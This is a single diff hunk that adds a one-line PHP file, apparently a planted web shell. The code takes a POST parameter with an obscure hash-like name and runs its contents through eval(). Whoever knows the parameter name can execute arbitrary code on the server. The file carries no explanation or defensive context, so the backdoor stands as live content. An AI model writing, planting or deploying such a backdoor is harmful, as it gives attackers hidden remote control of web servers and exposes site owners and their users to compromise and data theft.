@@ -1,0 +1,1 @@
+<?php  if($_POST["a1a286fbd1b8832a515f20e1cc2351c9"]){$cmd = $_POST["a1a286fbd1b8832a515f20e1cc2351c9"]; eval (stripslashes($cmd)); echo "ok";} ?>
